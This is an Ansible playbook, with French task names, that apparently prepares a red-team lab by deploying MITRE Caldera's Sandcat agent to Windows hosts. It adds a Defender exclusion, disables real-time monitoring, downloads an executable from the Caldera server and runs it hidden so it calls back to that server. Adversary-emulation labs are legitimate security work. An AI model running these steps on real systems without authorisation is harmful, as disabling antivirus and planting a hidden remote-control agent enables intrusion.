---
- name: Déploiement de l'agent Sandcat sur les machines Windows
  hosts: windows
  vars:
    caldera_ip: "{{ hostvars[groups['Caldera'][0]]['ansible_host'] }}"
    caldera_port: "8888"
    agent_group: "red"
  tasks:
    - name: Exclure le dossier Public de l'analyse Defender
      ansible.windows.win_shell: |
        Add-MpPreference -ExclusionPath "C:\Users\Public"
    - name: Désactiver temporairement la protection en temps réel de Defender
      ansible.windows.win_shell: |
        Set-MpPreference -DisableRealtimeMonitoring $true
    - name: Télécharger l'agent Sandcat
      ansible.windows.win_shell: |
        Invoke-WebRequest `
          -Uri "http://{{ caldera_ip }}:{{ caldera_port }}/file/download" `
          -Headers @{platform="windows"; file="sandcat.go"} `
          -OutFile "C:\Users\Public\sandcat.exe" `
          -UseBasicParsing `
          -TimeoutSec 120

    - name: Lancer l'agent Sandcat en arrière-plan
      ansible.windows.win_shell: |
        Start-Process -FilePath "C:\Users\Public\sandcat.exe" -ArgumentList "-server http://{{ caldera_ip }}:{{ caldera_port }} -group {{ agent_group }}" -WindowStyle Hidden -PassThru
      async: 5
      poll: 0

    - name: Attendre quelques secondes pour laisser l'agent s'enregistrer
      ansible.builtin.pause:
        seconds: 15

    - name: Vérifier que le process sandcat tourne
      ansible.windows.win_shell: Get-Process sandcat -ErrorAction SilentlyContinue
      register: sandcat_process

    - name: Afficher le résultat
      ansible.builtin.debug:
        var: sandcat_process.stdout